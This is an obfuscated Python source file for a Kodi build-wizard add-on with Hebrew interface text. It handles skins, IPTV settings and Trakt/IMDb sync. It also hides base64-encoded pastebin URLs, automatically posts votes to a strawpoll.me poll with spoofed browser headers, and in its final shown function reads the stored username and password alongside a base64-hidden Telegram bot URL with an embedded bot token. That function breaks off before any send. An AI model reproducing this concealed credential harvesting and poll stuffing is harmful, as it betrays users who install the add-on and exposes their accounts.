# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPVICTORY =wiz .getS ('keepvictory')#line:138
KEEPTELEMEDIA =wiz .getS ('keeptelemedia')#line:139
KEEPTVLIST =wiz .getS ('keeptvlist')#line:140
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:141
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:142
KEEPHUBTV =wiz .getS ('keephubtv')#line:143
KEEPHUBVOD =wiz .getS ('keephubvod')#line:144
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:145
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:146
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:147
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:148
HARDWAER =wiz .getS ('action')#line:149
USERNAME =wiz .getS ('user')#line:150
PASSWORD =wiz .getS ('pass')#line:151
KEEPWEATHER =wiz .getS ('keepweather')#line:152
KEEPFAVS =wiz .getS ('keepfavourites')#line:153
KEEPSOURCES =wiz .getS ('keepsources')#line:154
KEEPPROFILES =wiz .getS ('keepprofiles')#line:155
KEEPADVANCED =wiz .getS ('keepadvanced')#line:156
KEEPREPOS =wiz .getS ('keeprepos')#line:157
KEEPSUPER =wiz .getS ('keepsuper')#line:158
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:159
KEEPTRAKT =wiz .getS ('keeptrakt')#line:160
KEEPREAL =wiz .getS ('keepdebrid')#line:161
KEEPRD2 =wiz .getS ('keeprd2')#line:162
KEEPLOGIN =wiz .getS ('keeplogin')#line:163
LOGINSAVE =wiz .getS ('loginlastsave')#line:164
DEVELOPER =wiz .getS ('developer')#line:165
THIRDPARTY =wiz .getS ('enable3rd')#line:166
THIRD1NAME =wiz .getS ('wizard1name')#line:167
THIRD1URL =wiz .getS ('wizard1url')#line:168
THIRD2NAME =wiz .getS ('wizard2name')#line:169
THIRD2URL =wiz .getS ('wizard2url')#line:170
THIRD3NAME =wiz .getS ('wizard3name')#line:171
THIRD3URL =wiz .getS ('wizard3url')#line:172
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:173
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:174
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:175
TODAY =date .today ()#line:176
TOMORROW =TODAY +timedelta (days =1 )#line:177
THREEDAYS =TODAY +timedelta (days =3 )#line:178
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:179
MCNAME =wiz .mediaCenter ()#line:180
EXCLUDES =uservar .EXCLUDES #line:181
SPEEDFILE =speedtest .SPEEDFILE #line:182
APKFILE =uservar .APKFILE #line:183
YOUTUBETITLE =uservar .YOUTUBETITLE #line:184
YOUTUBEFILE =uservar .YOUTUBEFILE #line:185
SPEED =speedtest .SPEED #line:186
UNAME =speedtest .UNAME #line:187
ADDONFILE =uservar .ADDONFILE #line:188
ADVANCEDFILE =uservar .ADVANCEDFILE #line:189
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:190
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:191
NOTIFICATION =uservar .NOTIFICATION #line:192
NOTIFICATION2 =uservar .NOTIFICATION2 #line:193
NOTIFICATION3 =uservar .NOTIFICATION3 #line:194
HELPINFO =uservar .HELPINFO #line:195
ENABLE =uservar .ENABLE #line:196
HEADERMESSAGE =uservar .HEADERMESSAGE #line:197
AUTOUPDATE =uservar .AUTOUPDATE #line:198
WIZARDFILE =uservar .WIZARDFILE #line:199
HIDECONTACT =uservar .HIDECONTACT #line:200
SKINID18 =uservar .SKINID18 #line:201
SKINID18DDONXML =uservar .SKINID18DDONXML #line:202
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:203
SKINID17 =uservar .SKINID17 #line:204
SKINID17DDONXML =uservar .SKINID17DDONXML #line:205
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:206
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:207
CONTACT =uservar .CONTACT #line:208
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:209
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:210
HIDESPACERS =uservar .HIDESPACERS #line:211
TMDB_NEW_API =uservar .TMDB_NEW_API #line:212
COLOR1 =uservar .COLOR1 #line:213
COLOR2 =uservar .COLOR2 #line:214
THEME1 =uservar .THEME1 #line:215
THEME2 =uservar .THEME2 #line:216
THEME3 =uservar .THEME3 #line:217
THEME4 =uservar .THEME4 #line:218
THEME5 =uservar .THEME5 #line:219
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:221
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:222
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:223
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:224
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:225
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:226
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:227
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:228
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:229
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:230
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:231
LOGFILES =wiz .LOGFILES #line:232
TRAKTID =traktit .TRAKTID #line:233
DEBRIDID =debridit .DEBRIDID #line:234
LOGINID =loginit .LOGINID #line:235
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:236
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:237
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:238
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:239
fullsecfold =xbmc .translatePath ('special://home')#line:240
addons_folder =os .path .join (fullsecfold ,'addons')#line:242
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:244
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:246
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:248
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:249
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:250
IPTV18 ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimpleandroid.zip?raw=true'#line:253
IPTVSIMPL18PC ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimple.zip?raw=true'#line:254
def MainMenu ():#line:261
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:263
def skinWIN ():#line:264
	idle ()#line:265
	OO00OO0OO00OOOOO0 =glob .glob (os .path .join (ADDONS ,'skin*'))#line:266
	OOO00000OO0000OO0 =[];OOOO0000O00OO000O =[]#line:267
	for O0OO00OO00OOO000O in sorted (OO00OO0OO00OOOOO0 ,key =lambda OO0OOOOOOO0000000 :OO0OOOOOOO0000000 ):#line:268
		O0O000OOOOO000O0O =os .path .split (O0OO00OO00OOO000O [:-1 ])[1 ]#line:269
		O000000OO0OO00O00 =os .path .join (O0OO00OO00OOO000O ,'addon.xml')#line:270
		if os .path .exists (O000000OO0OO00O00 ):#line:271
			O0OO0O00OOO0000OO =open (O000000OO0OO00O00 )#line:272
			OOOOOO0O0OOOOOO0O =O0OO0O00OOO0000OO .read ()#line:273
			O0O00O0000OOOOOOO =parseDOM2 (OOOOOO0O0OOOOOO0O ,'addon',ret ='id')#line:274
			O00OO00OOO000O0O0 =O0O000OOOOO000O0O if len (O0O00O0000OOOOOOO )==0 else O0O00O0000OOOOOOO [0 ]#line:275
			try :#line:276
				OO000OO0000000000 =xbmcaddon .Addon (id =O00OO00OOO000O0O0 )#line:277
				OOO00000OO0000OO0 .append (OO000OO0000000000 .getAddonInfo ('name'))#line:278
				OOOO0000O00OO000O .append (O00OO00OOO000O0O0 )#line:279
			except :#line:280
				pass #line:281
	O000OOO00O0O00OO0 =[];OO0OO0OOOO00OOOOO =0 #line:282
	OO0O0OO00O00OOO00 =["Current Skin -- %s"%currSkin ()]+OOO00000OO0000OO0 #line:283
	OO0OO0OOOO00OOOOO =DIALOG .select ("Select the Skin you want to swap with.",OO0O0OO00O00OOO00 )#line:284
	if OO0OO0OOOO00OOOOO ==-1 :return #line:285
	else :#line:286
		OO0O0OO000O00O0OO =(OO0OO0OOOO00OOOOO -1 )#line:287
		O000OOO00O0O00OO0 .append (OO0O0OO000O00O0OO )#line:288
		OO0O0OO00O00OOO00 [OO0OO0OOOO00OOOOO ]="%s"%(OOO00000OO0000OO0 [OO0O0OO000O00O0OO ])#line:289
	if O000OOO00O0O00OO0 ==None :return #line:290
	for O0OO00O0O0O00O00O in O000OOO00O0O00OO0 :#line:291
		swapSkins (OOOO0000O00OO000O [O0OO00O0O0O00O00O ])#line:292
def currSkin ():#line:294
	return xbmc .getSkinDir ('Container.PluginName')#line:295
def swapSkins (O0O0O000000O000OO ,title ="Error"):#line:296
	O00O0OO0OOO0000O0 ='lookandfeel.skin'#line:297
	O00O00O0OOO0O0000 =O0O0O000000O000OO #line:298
	OO00O00OO00000O0O =getOld (O00O0OO0OOO0000O0 )#line:299
	O0OO00O00O000O000 =O00O0OO0OOO0000O0 #line:300
	setNew (O0OO00O00O000O000 ,O00O00O0OOO0O0000 )#line:301
	OOOO0000O00OOOO00 =0 #line:302
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOO0000O00OOOO00 <100 :#line:303
		OOOO0000O00OOOO00 +=1 #line:304
		xbmc .sleep (1 )#line:305
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:306
		xbmc .executebuiltin ('SendClick(11)')#line:307
	return True #line:308
def getOld (O0OOO0OOOO00OO0O0 ):#line:310
	try :#line:311
		O0OOO0OOOO00OO0O0 ='"%s"'%O0OOO0OOOO00OO0O0 #line:312
		OO0O0000O00OO000O ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O0OOO0OOOO00OO0O0 )#line:313
		OO00O000O00O000OO =xbmc .executeJSONRPC (OO0O0000O00OO000O )#line:315
		OO00O000O00O000OO =simplejson .loads (OO00O000O00O000OO )#line:316
		if OO00O000O00O000OO .has_key ('result'):#line:317
			if OO00O000O00O000OO ['result'].has_key ('value'):#line:318
				return OO00O000O00O000OO ['result']['value']#line:319
	except :#line:320
		pass #line:321
	return None #line:322
def setNew (OO0OO0OOOOOO0O00O ,OO0O0OOOO0000O000 ):#line:325
	try :#line:326
		OO0OO0OOOOOO0O00O ='"%s"'%OO0OO0OOOOOO0O00O #line:327
		OO0O0OOOO0000O000 ='"%s"'%OO0O0OOOO0000O000 #line:328
		O0O00OOOOO0O0OO0O ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OO0OO0OOOOOO0O00O ,OO0O0OOOO0000O000 )#line:329
		O00OO00O0OOOO0O00 =xbmc .executeJSONRPC (O0O00OOOOO0O0OO0O )#line:331
	except :#line:332
		pass #line:333
	return None #line:334
def idle ():#line:335
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:336
def resetkodi ():#line:338
		if xbmc .getCondVisibility ('system.platform.windows'):#line:339
			O00OO00000OOO000O =xbmcgui .DialogProgress ()#line:340
			O00OO00000OOO000O .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:343
			O00OO00000OOO000O .update (0 )#line:344
			for O0000O000O0O00O0O in range (5 ,-1 ,-1 ):#line:345
				time .sleep (1 )#line:346
				O00OO00000OOO000O .update (int ((5 -O0000O000O0O00O0O )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (O0000O000O0O00O0O ),'')#line:347
				if O00OO00000OOO000O .iscanceled ():#line:348
					from resources .libs import win #line:349
					return None ,None #line:350
			from resources .libs import win #line:351
		else :#line:352
			O00OO00000OOO000O =xbmcgui .DialogProgress ()#line:353
			O00OO00000OOO000O .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:356
			O00OO00000OOO000O .update (0 )#line:357
			for O0000O000O0O00O0O in range (5 ,-1 ,-1 ):#line:358
				time .sleep (1 )#line:359
				O00OO00000OOO000O .update (int ((5 -O0000O000O0O00O0O )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O0000O000O0O00O0O ),'')#line:360
				if O00OO00000OOO000O .iscanceled ():#line:361
					os ._exit (1 )#line:362
					return None ,None #line:363
			os ._exit (1 )#line:364
def backtokodi ():#line:366
			wiz .kodi17Fix ()#line:367
			fix18update ()#line:368
			fix17update ()#line:369
def testcommand1 ():#line:371
    import requests #line:372
    O0O0OOOO00OO00OOO ='18773068'#line:373
    OOOOO000O0OO0OO00 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0O0OOOO00OO00OOO ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:385
    OOO00O0000OO0O0OO ='145273320'#line:387
    O00OOO0O00O000OO0 ='145272688'#line:388
    if ADDON .getSetting ("auto_rd")=='true':#line:389
        O0OOOO00O00OO0OOO =OOO00O0000OO0O0OO #line:390
    else :#line:391
        O0OOOO00O00OO0OOO =O00OOO0O00O000OO0 #line:392
    OOOOOOOOOO0O0O000 ={'options':O0OOOO00O00OO0OOO }#line:396
    OO0OO0O0000OO0OO0 =requests .post ('https://www.strawpoll.me/'+O0O0OOOO00OO00OOO ,headers =OOOOO000O0OO0OO00 ,data =OOOOOOOOOO0O0O000 )#line:398
def builde_Votes ():#line:399
   try :#line:400
        import requests #line:401
        OO0OO0O00O0OOO0O0 ='18773068'#line:402
        O00O0OO0OOO0OO000 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OO0OO0O00O0OOO0O0 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:414
        OOOOO00O000OOO0OO ='145273320'#line:416
        OO000OOO0OO00O0OO ={'options':OOOOO00O000OOO0OO }#line:422
        OO0OO00OOO00OO00O =requests .post ('https://www.strawpoll.me/'+OO0OO0O00O0OOO0O0 ,headers =O00O0OO0OOO0OO000 ,data =OO000OOO0OO00O0OO )#line:424
   except :pass #line:425
def update_Votes ():#line:426
   try :#line:427
        import requests #line:428
        O0O00OO0O0O00O000 ='18773068'#line:429
        OOO0O00OOO0O0O00O ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0O00OO0O0O00O000 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:441
        OOOOOOO00000OOO0O ='145273321'#line:443
        O000OOOO00O000O0O ={'options':OOOOOOO00000OOO0O }#line:449
        OOOO00OO000OOO00O =requests .post ('https://www.strawpoll.me/'+O0O00OO0O0O00O000 ,headers =OOO0O00OOO0O0O00O ,data =O000OOOO00O000O0O )#line:451
   except :pass #line:452
def testcommand ():#line:456
	if os .path .exists (os .path .join (ADDONS ,'plugin.video.telemedia')):#line:457
		O0000OO0OOOO0000O =xbmcaddon .Addon ('plugin.video.telemedia')#line:458
	if os .path .exists (os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","plugin.video.telemedia/database","td.binlog")):#line:459
		O0000OO0OOOO0000O .setSetting ('autologin','true')#line:460
def skin_homeselect ():#line:461
	try :#line:463
		OOOOO000O0O000OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:464
		OOOOOO0O0OOOOO00O =open (OOOOO000O0O000OO0 ,'r')#line:466
		OO0000OOOOOO00OO0 =OOOOOO0O0OOOOO00O .read ()#line:467
		OOOOOO0O0OOOOO00O .close ()#line:468
		OOOO00O00000OO000 ='<setting id="HomeS" type="string(.+?)/setting>'#line:469
		O0O0O0O0OO0OOO00O =re .compile (OOOO00O00000OO000 ).findall (OO0000OOOOOO00OO0 )[0 ]#line:470
		OOOOOO0O0OOOOO00O =open (OOOOO000O0O000OO0 ,'w')#line:471
		OOOOOO0O0OOOOO00O .write (OO0000OOOOOO00OO0 .replace ('<setting id="HomeS" type="string%s/setting>'%O0O0O0O0OO0OOO00O ,'<setting id="HomeS" type="string"></setting>'))#line:472
		OOOOOO0O0OOOOO00O .close ()#line:473
	except :#line:474
		pass #line:475
def autotrakt ():#line:478
    O0O0O0OOO0OO0OOO0 =(ADDON .getSetting ("auto_trk"))#line:479
    if O0O0O0OOO0OO0OOO0 =='true':#line:480
       from resources .libs import trk_aut #line:481
def traktsync ():#line:483
     O0OO0O00O0O0OOO0O =(ADDON .getSetting ("auto_trk"))#line:484
     if O0OO0O00O0O0OOO0O =='true':#line:485
       from resources .libs import trk_aut #line:488
     else :#line:489
        ADDON .openSettings ()#line:490
def imdb_synck ():#line:492
   try :#line:493
     O00O0000O0OOO0000 =xbmcaddon .Addon ('plugin.video.exodusredux')#line:494
     O000O0OO0O000O0OO =xbmcaddon .Addon ('plugin.video.gaia')#line:495
     O000O0O000OOOO0O0 =(ADDON .getSetting ("imdb_sync"))#line:496
     O0OOOOO000O000OOO ="imdb.user"#line:497
     OO0OO00OO0O00OO0O ="accounts.informants.imdb.user"#line:498
     O00O0000O0OOO0000 .setSetting (O0OOOOO000O000OOO ,str (O000O0O000OOOO0O0 ))#line:499
     O000O0OO0O000O0OO .setSetting ('accounts.informants.imdb.enabled','true')#line:500
     O000O0OO0O000O0OO .setSetting (OO0OO00OO0O00OO0O ,str (O000O0O000OOOO0O0 ))#line:501
   except :pass #line:502
def dis_or_enable_addon (O0OOO0O0000OOOOO0 ,OO00O000OOO0OO0OO ,enable ="true"):#line:504
    import json #line:505
    O0O0O000OOO00O0OO ='"%s"'%O0OOO0O0000OOOOO0 #line:506
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O0OOO0O0000OOOOO0 )and enable =="true":#line:507
        logging .warning ('already Enabled')#line:508
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O0OOO0O0000OOOOO0 )#line:509
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O0OOO0O0000OOOOO0 )and enable =="false":#line:510
        return xbmc .log ("### Skipped %s, reason = not installed"%O0OOO0O0000OOOOO0 )#line:511
    else :#line:512
        O0O000OOO0OOO0O0O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O0O0O000OOO00O0OO ,enable )#line:513
        OO000O0O0O0O0O0O0 =xbmc .executeJSONRPC (O0O000OOO0OOO0O0O )#line:514
        OO0000O0OO0OO0OO0 =json .loads (OO000O0O0O0O0O0O0 )#line:515
        if enable =="true":#line:516
            xbmc .log ("### Enabled %s, response = %s"%(O0OOO0O0000OOOOO0 ,OO0000O0OO0OO0OO0 ))#line:517
        else :#line:518
            xbmc .log ("### Disabled %s, response = %s"%(O0OOO0O0000OOOOO0 ,OO0000O0OO0OO0OO0 ))#line:519
    if OO00O000OOO0OO0OO =='auto':#line:520
     return True #line:521
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:522
def iptvset ():#line:525
  try :#line:526
    O0O0OO000000000OO =(ADDON .getSetting ("iptv_on"))#line:527
    if O0O0OO000000000OO =='true':#line:529
       if KODIV >=17 and KODIV <18 :#line:531
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:532
         O00O00O0000OO000O =xbmcaddon .Addon ('pvr.iptvsimple')#line:533
         O000OOOOOO0OOOO00 =(ADDON .getSetting ("iptvUrl"))#line:535
         O00O00O0000OO000O .setSetting ('m3uUrl',O000OOOOOO0OOOO00 )#line:536
         O0OOO00OOOOOO0OOO =(ADDON .getSetting ("epg_Url"))#line:537
         O00O00O0000OO000O .setSetting ('epgUrl',O0OOO00OOOOOO0OOO )#line:538
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:541
         iptvsimpldownpc ()#line:542
         wiz .kodi17Fix ()#line:543
         xbmc .sleep (1000 )#line:544
         O00O00O0000OO000O =xbmcaddon .Addon ('pvr.iptvsimple')#line:545
         O000OOOOOO0OOOO00 =(ADDON .getSetting ("iptvUrl"))#line:546
         O00O00O0000OO000O .setSetting ('m3uUrl',O000OOOOOO0OOOO00 )#line:547
         O0OOO00OOOOOO0OOO =(ADDON .getSetting ("epg_Url"))#line:548
         O00O00O0000OO000O .setSetting ('epgUrl',O0OOO00OOOOOO0OOO )#line:549
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:551
         iptvsimpldown ()#line:552
         wiz .kodi17Fix ()#line:553
         xbmc .sleep (1000 )#line:554
         O00O00O0000OO000O =xbmcaddon .Addon ('pvr.iptvsimple')#line:555
         O000OOOOOO0OOOO00 =(ADDON .getSetting ("iptvUrl"))#line:556
         O00O00O0000OO000O .setSetting ('m3uUrl',O000OOOOOO0OOOO00 )#line:557
         O0OOO00OOOOOO0OOO =(ADDON .getSetting ("epg_Url"))#line:558
         O00O00O0000OO000O .setSetting ('epgUrl',O0OOO00OOOOOO0OOO )#line:559
  except :pass #line:560
def howsentlog ():#line:567
       try :#line:568
          import json #line:569
          OOOO0OOO000OOO0O0 =(ADDON .getSetting ("user"))#line:570
          OO0OOOO0O00O000OO =(ADDON .getSetting ("pass"))#line:571
          OOO00O00O0OO00O00 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:572
          OOOO00O000O000000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:574
